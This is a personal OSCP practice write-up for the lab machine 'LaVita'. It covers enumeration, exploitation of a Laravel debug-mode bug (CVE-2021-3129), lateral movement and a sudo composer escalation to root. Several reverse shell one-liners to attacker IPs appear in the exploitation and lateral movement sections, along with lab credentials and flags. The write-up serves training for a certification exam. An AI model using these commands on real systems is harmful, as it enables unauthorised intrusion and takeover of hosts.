---
title: OSCP - LaVita - Linux
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
tags:
  - cyber-security
related: "[[Cyber Security]]"
---
# LaVita
This box started out really well with plenty of through enumeration to identify the vulnerability, but I fell down trying to gain initial access with the exploits. I tried several, and persisted with the most well developed exploit thinking it would be the way forward. 

The issue was not realising the exploit would stop working after the first success, so after testing it with the `uname -a` or `id` commands, it would then not work when I tried to repeat with a reverse shell command. it took awhile to realise that there were 21 chains available, and so there was no need to keep using the "last working" chain, because it was only working once anyway. I also stopped trying to test with `id` and just threw the reverse shell command in straight away - I already knew the exploit worked *sometimes* so may as well try to establish a shell each time I tried.

After a LOT of frustration I finally got initial access only to find I didn't have a real user, and would probably need to move laterally to `skunk` before I could get `root`. I'd had issues running `pspy32` on boxes previously but had success this time around by using `wget` to pull it from a local http server, and with it running it was easy to identify the process running as `skunk`, realise it was a php file, and then add a reverse shell to the php file to get access as `skunk`.

As usual, as soon as you gain new access the enumeration process starts again. In this case i was lucky I found `skunk` had sudo privileges, and those privileges were related to a binary with an entry in GTFObins that allowed privesc through `sudo`. Getting the binary commands correct was a little tricky, and it took a bit to realise I needed to make the file changes as `www-data` but run the `sudo` command as `skunk`. But I got there after a whole lot of slog. This box is a great reminder that you are learning new things with every new attempt, and your processes are getting more and more refined with each box - it's not likely to get easier, but with every box to you complete you're gaining vital experience and getting closer to the standard required to pass the exam.

# Resolution summary
- Ran Nmap to identify ports `22` & `80`
- Visited http (`80`) & identified laravel
- Created user & entered debug mode
- Researched vulnerability and attempted multiple exploits
- Achieved reverse shell and enumerated as `www-data`
- Identified process running as user `skunk` and modified to establish 2nd reverse shell as `skunk`
- Checked sudo privileges and found potential privilege escalation vector through GTFObins
- Modified `composer` file as `www-data` and ran command as `skunk` to achieve `root`
## Improved skills
- Running multiple reverse shells
- Understanding gadget chains
## Used tools
- nmap
- gobuster
- python3

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN LaVita.nmap 192.168.201.38 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: W3.CSS Template
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache)
- Navigated to `http://192.168.201.38:80` and used Wappalyzer to identify `W3.CSS` & `Font Awesome 4.7.0`
![OSCP Lavita Linux Image1](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image1.png)
- Navigated to bottom of `http://192.168.201.38:80`, identified contact form, and entered test message
![OSCP Lavita Linux Image2](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image2.png)
- Message submission redirected to `404 not found` and identified `Laravel 8.4.0`
![OSCP Lavita Linux Image3](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image3.png)
		- `Laravel 8.4.0` is vulnerable to [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129) (arbitary code execution for unauthenticated users for sites in debug mode with Laravel before 8.4.2)
- Ran `gobuster dir -u http://192.168.201.38 -w //usr/share/dirb/wordlists/common.txt` to identify any web directories
![OSCP Lavita Linux Image4](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image4.png)
- Navigated to `http://192.168.201.38/login` and identified page for "Login" or "Register"
![OSCP Lavita Linux Image5](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image5.png)
- Unsuccessful with "offsec@kali" and password `pass`
![OSCP Lavita Linux Image6](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image6.png)
- Navigated to `http://192.168.201.38/register`, registered user with credentials `offsec:password` (email: offsec@kali.com), and redirected to `http://192.168.201.38/home` with access to "Dashboard testing Area"
![OSCP Lavita Linux Image7](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image7.png)
- Navigated to `http://192.168.201.38/robots.txt` 
![OSCP Lavita Linux Image8](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image8.png)
- Navigated to `http://192.168.201.38/web.config` and viewed page source (potentially using `Microsoft IIS service`)
![OSCP Lavita Linux Image9](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image9.png)
---
# Exploitation
## Name of the technique
- Clicked "Enable" to enable debugging
![OSCP Lavita Linux Image10](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image10.png)
- Tested access to `http://192.168.201.38/_ignition/execute-solution` to confirm debug mode in ON and determine Laravel root directory is `/var/www/html/lavita`
![OSCP Lavita Linux Image11](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image11.png)
- Identified `laravel-8.4.2-rce` exploit from `https://github.com/khanhnv-2091/laravel-8.4.2-rce/blob/main/exploit.py`
	- Saved `exploit.py` as `laravelexploit.py` and ran `python3 laravelexploit.py http://192.168.201.38:80 /var/www/html/laravel/storage/logs/laravel.log 'uname -a'`
![OSCP Lavita Linux Image12](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image12.png)
- Identified `CVE-2021-3129` exploit from `https://github.com/joshuavanderpoll/CVE-2021-3129/blob/main/CVE-2021-3129.py`
	- Saved `CVE-2021-3129.py` and ran `python3 CVE-2021-3129.py --host http://192.168.201.38 --exec 'uname -a' --force
![OSCP Lavita Linux Image13](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image13.png)
![OSCP Lavita Linux Image14](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image14.png)
- Reran exploit with bash command for reverse shell but received no output or reverse shell: `python3 CVE-2021-3129.py --host http://192.168.201.38 --exec 'bash -i >& /dev/tcp/192.168.45.215/4444 0>&1' --force`
![OSCP Lavita Linux Image15](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image15.png)
- Reran exploit with netcat command for reverse shell but no output and no reverse shell: 
```
python3 CVE-2021-3129.py --host http://192.168.117.38
execute nc 192.168.45.250 4444 -e /bin/sh
```
- Reran exploit with same command but testing the next chain
![OSCP Lavita Linux Image16](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image16.png)
- Command above hung, and checked other tab to find incoming reverse shell 
![OSCP Lavita Linux Image17](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image17.png)
---
# Lateral Movement to user
## Local Enumeration
- Ran `cat /etc/passwd` and identified user `skunk`
![OSCP Lavita Linux Image18](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image18.png)
- Navigated to `/home/skunk`, identified `local.txt`, and printed file with `cat /home/skunk/local.txt`
![OSCP Lavita Linux Image19](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image19.png)
- Navigated to `/var/www/html/lavita/storage`, ran `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh` to download `linpeas.sh`, and used `chmod +x linpeas.sh` to make it executable
![OSCP Lavita Linux Image20](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image20.png)
- Ran `./linpeas.sh` and identified multiple processes belonging to `www-data` but user is `root`
![OSCP Lavita Linux Image21](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image21.png)
- Identified `ptrace` protection is *disabled*
![OSCP Lavita Linux Image22](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image22.png)
- Identified user `skunk` is a member of `sudo`
![OSCP Lavita Linux Image23](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image23.png)
- Identified `postfix` file
![OSCP Lavita Linux Image24](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image24.png)
- Identified `mysql` credentials (`lavita:sdfquelw0kly9jgbx92`)
![OSCP Lavita Linux Image25](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image25.png)
- Identified other interesting files
![OSCP Lavita Linux Image26](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image26.png)
- Tested `su skunk` using credentials `skunk:skunk`
![OSCP Lavita Linux Image27](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image27.png)
- Uploaded `pspy32` to target
![OSCP Lavita Linux Image28](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image28.png)
- Ran `./pspy32` and identified processes running for user `skunk` (UID=1001)
![OSCP Lavita Linux Image29](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image29.png)
- Run `ls -lah /var/www/html/lavita/artisan` to check permissions for artisan, and identify that user `www-data` has write access
![OSCP Lavita Linux Image30](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image30.png)
- Ran `cat /var/www/html/lavita/artisan` & identified php file
![OSCP Lavita Linux Image31](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image31.png)
## Lateral Movement vector
- Ran `nc -nvlp 4545` to start netcat listener on port 4545
- Ran `echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.250 4545>/tmp/f'); ?>" > /var/www/html/lavita/artisan` to echo PHP reverse shell script into `artisan` file
- Caught reverse shell with netcat as `skunk` user
![OSCP Lavita Linux Image32](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image32.png)
---
# Privilege Escalation
## Local Enumeration
- `skunk` previously identified as member of `sudo` group, so ran `sudo -l`
![OSCP Lavita Linux Image33](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image33.png)
## Privilege Escalation vector
- Identified [GTFObins](https://gtfobins.github.io/gtfobins/composer/#sudo) for `composer` run by `sudo`, so modified `composer.json` with `echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json` as `www-data` user
![OSCP Lavita Linux Image34](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image34.png)
- Ran `sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x` as `skunk` user and gained `root` access
![OSCP Lavita Linux Image35](/images/OSCP%20-%20LaVita%20-%20Linux%20-%20image35.png)
- Ran `cat /root/proof.txt` to print `proof.txt`
---
# Trophy & Loot
`local.txt` = `9aca8d958ec6c654109f8bfffe951a19`
`root.txt` = `0d57d7ed54dc6b2b087332f04ff4f26e`

